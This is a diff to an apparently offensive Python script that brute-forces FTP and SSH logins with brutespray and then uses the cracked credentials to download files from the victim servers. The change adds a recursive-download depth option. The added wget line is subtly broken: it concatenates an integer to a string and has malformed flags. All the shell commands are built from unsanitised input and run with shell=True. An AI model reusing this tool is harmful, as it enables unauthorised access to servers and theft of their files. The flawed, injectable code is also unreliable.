@@ -15,6 +15,7 @@ def _parse_args():
 	parser.add_argument('-f', '--filepath', type=str, default=None, help='Specify a single filepath to retrieve')
 	parser.add_argument('-ftpfl', '--ftp_files', type=str, default="ftp_filepaths.txt", help='Specify a .txt file listing the files to retrieve from ftp servers')
 	parser.add_argument('-sshfl', '--ssh_files', type=str, default='ssh_filepaths.txt', help="Specify a .txt file listing the files to retrieve from ssh servers")
+	parser.add_argument('-ftpr', '--ftp_recursion_depth', type=int, default=5, help="Max levels of recursive downloading for each target directory")
 	args = parser.parse_args()
 	return args
 
@@ -36,12 +37,12 @@ def run_brutespray(threads: int):
 	brute_out, brute_err = brute_poc.communicate()
 	# print(brute_out.decode('utf-8'))
 
-def get_ftp_files(ip, username, password, filepath=None):
+def get_ftp_files(ip, username, password, filepath=None, recursion_depth=5):
 	filename = filepath.split('/')
 	filename = filename[-1]
 	mkdir = "mkdir -p ftp/" + username + ":" + ip + "; cd ftp/" + username + ":" + ip + ";"
 	# get = "curl ftp://" + username + ":" + password + "@" + ip + filepath + " -o " + filename + ";"
-	get = "wget ftp://" + username + ":" + password + "@" + ip + filepath + " -r;"
+	get = "wget ftp://" + username + ":" + password + "@" + ip + filepath + " -r + -l + " + recursion_depth + ";"
 	cmd = mkdir + get
 	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
 	out, err = proc.communicate()
@@ -102,9 +103,9 @@ if __name__ == "__main__":
 						with open(args.ftp_files) as files:
 							for filename in files:
 								filename = filename.split()[0]
-								get_ftp_files(match.group(1), match.group(2), match.group(3), filename)
+								get_ftp_files(match.group(1), match.group(2), match.group(3), filename, args.ftp_recursion_depth)
 					else: 
-						get_ftp_files(match.group(1), match.group(2), match.group(3), args.filepath)
+						get_ftp_files(match.group(1), match.group(2), match.group(3), args.filepath, args.ftp_recursion_depth)
 	# get scp files
 	if ssh_file.is_file():
 		print("==== retreiving info from ssh servers")
